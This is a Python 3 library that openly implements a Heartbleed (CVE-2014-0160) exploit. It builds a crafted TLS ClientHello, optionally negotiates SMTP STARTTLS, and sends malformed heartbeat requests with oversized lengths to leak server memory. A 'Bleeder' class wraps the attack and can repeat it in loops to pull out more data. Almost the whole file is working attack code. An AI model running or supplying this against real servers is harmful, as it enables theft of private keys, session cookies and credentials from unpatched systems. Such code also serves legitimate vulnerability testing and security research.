"""
OpenSSL Heartbleed (CVE-2014-0160) library.
Author: Einar Otto Stangvik / @einaros / https://hacking.ventures
Environment: Python 3
"""
import sys, socket, time, struct, select, re, binascii
import ciphers

CLIENTHELLO_BASE_LENGTH = 0x74
MAX_LENGTH = 0xFFFF - 19 # Max heartbeat length is 0xFFFF subtracted the padding and hb header

def hexdump(s):
  for b in range(0, len(s), 16):
    lin = [c for c in s[b : b + 16]]
    hxdat = ' '.join('%02X' % c for c in lin)
    pdat = ''.join((chr(c) if 32 <= c <= 126 else '.' )for c in lin)
    print('  %04x: %-48s %s' % (b, hxdat, pdat))
  print()

def recv_until(s, match, timeout, maxlength=4096):
  endtime = time.time() + timeout
  rdata = b''
  remain = maxlength
  found = False
  while remain > 0:
    rtime = endtime - time.time() 
    if rtime < 0:
      if len(rdata) > 0:
        break
      return False,None
    r, w, e = select.select([s], [], [], timeout)
    if s in r:
      data = s.recv(remain)
      if not data:
        break
      rdata += data
      if match in rdata:
        found = True
        break
      remain -= len(data)
  return found,rdata

def recv_len(s, length, timeout):
  endtime = time.time() + timeout
  rdata = b''
  remain = length
  while remain > 0:
    rtime = endtime - time.time() 
    if rtime < 0:
      if len(rdata) > 0:
        break
      return None
    r, w, e = select.select([s], [], [], timeout)
    if s in r:
      data = s.recv(remain)
      if not data:
        break
      rdata += data
      remain -= len(data)
  return rdata

def init_starttls(s, smtp_hostname, verbose, timeout):
  found,buf = recv_until(s, '220 ', timeout)
  if verbose:
    print('> %s'%buf)
  if not found: return False
  if b'Microsoft' in buf: return False
  s.send(b'ehlo %s\r\n'%smtp_hostname)
  found,buf = recv_until(s, b'STARTTLS', timeout)
  if verbose:
    print('> %s'%buf)
  if not found: return False
  s.send(b'starttls\r\n')
  s.recv(1024)
  return True
    
def recv_tlsrecord(s, verbose, timeout):
  hdr = recv_len(s, 5, timeout)
  if hdr is None:
    if verbose:
      print('Error: Unexpected EOF receiving record header - server closed connection', file=sys.stderr)
    return None, None, None
  try:
    typ, ver, ln = struct.unpack('>BHH', hdr)
  except Exception:
    if verbose:
      print('Error: Invalid TLS response record received', file=sys.stderr)
    return None, None, None
  pay = recv_len(s, ln, timeout)
  if pay is None:
    if verbose:
      print('Error: Unexpected EOF receiving record payload - server closed connection', file=sys.stderr)
    return None, None, None
  if verbose:
    print('Received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)), file=sys.stderr)
  return typ, ver, pay

def make_heartbeat(version, length):
  version = struct.pack('>B', version)
  length = struct.pack('>H', length)
  return b'\x18\x03' + version + b'\x00\x03\x01' + length

def loopsend_hb(s, version, length, loops, verbose=False):
  length = min(MAX_LENGTH, length)
  hb = make_heartbeat(version, length)
  all_data = b''
  try:
    for i in range(loops):
      s.send(hb)
      block = s.recv(0xFFFF + 5)
      if block is None or len(block) == 0: break 
      all_data += block
  except:
    pass
  return len(all_data) > 24, all_data

def send_hb(s, version, length, timeout):
  length = min(MAX_LENGTH, length)
  expected = 24 + length
  hb = make_heartbeat(version, length)
  all_data = b''
  try:
    s.send(hb)
    data = recv_len(s, expected, timeout)
    if data is not None and len(data) > 0:
      all_data += data
  except Exception:
    pass
  return len(all_data) > 24, all_data

def blockbytes(blocks):
  return bytes([i for s in blocks for i in s])

class Bleeder(object):
  def __init__(self, length, ip, port, starttls=False, loops=1, verbose=False, timeout=2.5, smtp_hostname=None):
    self.length = length
    self.ip = ip
    self.port = port
    self.starttls = starttls
    self.loops = loops
    self.verbose = verbose
    self.timeout = timeout
    if smtp_hostname is None:
      smtp_hostname = 'starttlstest'
    self.smtp_hostname = smtp_hostname
    self.cipher = None
    self.bytes_received = 0
    self.start_time = time.time()

  def bleed(self):
    try:
      # init connection
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.settimeout(self.timeout)
      s.connect((self.ip, self.port))
      if self.starttls and not init_starttls(s, self.smtp_hostname, self.verbose, self.timeout):
        return False,None
      # build ClientHello
      if self.cipher is None:
        cipherbytes = ciphers.get_bytes()
      else:
        cipherbytes = self.cipher
      cipherbytes = struct.pack('>H', len(cipherbytes)) + cipherbytes
      record_length = struct.pack('>H', CLIENTHELLO_BASE_LENGTH + len(cipherbytes))
      msg_length = struct.pack('>I', CLIENTHELLO_BASE_LENGTH - 4 + len(cipherbytes))[1:]
      clienthello = b''.join([
          b'\x16\x03\x02', record_length, b'\x01', msg_length, 
          b'\x03\x02\x53\x43\x5b\x90\x9d\x9b\x72\x0b\xbc\x0c\xbc\x2b',
          b'\x92\xa8\x48\x97\xcf\xbd\x39\x04\xcc\x16\x0a\x85\x03\x90',
          b'\x9f\x77\x04\x33\xd4\xde\x00', cipherbytes,
          b'\x01\x00\x00\x49\x00\x0b\x00\x04\x03\x00\x01\x02\x00\x0a',
          b'\x00\x34\x00\x32\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c',
          b'\x00\x18\x00\x09\x00\x0a\x00\x16\x00\x17\x00\x08\x00\x06',
          b'\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13',
          b'\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10\x00\x11\x00\x23',
          b'\x00\x00\x00\x0f\x00\x01\x01'
        ])
      if self.verbose:
        print('Sending ClientHello: %d bytes'%len(clienthello))
      s.send(clienthello)
      # wait for the end of the handshake
      while True:
        typ, ver, pay = recv_tlsrecord(s, self.verbose, self.timeout)
        if typ == None:
          return False,None
        if typ == 22 and pay[0] == 0x02: # handshake
          if self.cipher is None:
            cipher_offset = 39
            self.cipher = pay[cipher_offset:cipher_offset+2]
            if self.verbose:
              print('Cipher: %s'%binascii.hexlify(self.cipher).decode('ascii').upper())
        if typ == 22 and pay[0] == 0x0E:
          break
      if self.loops <= 1:
        vulnerable,data = send_hb(s, ver&0x00FF, self.length, self.timeout)
      else:
        vulnerable,data = loopsend_hb(s, ver&0x00FF, self.length, self.loops, verbose=self.verbose)
      if vulnerable:
        self.bytes_received += len(data)
      return vulnerable,data
    except Exception as e:
      print(e, file=sys.stderr)
      return False,None
    finally:
      s.close()

  def get_bps(self):
    return 8 * self.bytes_received / (time.time()-self.start_time)
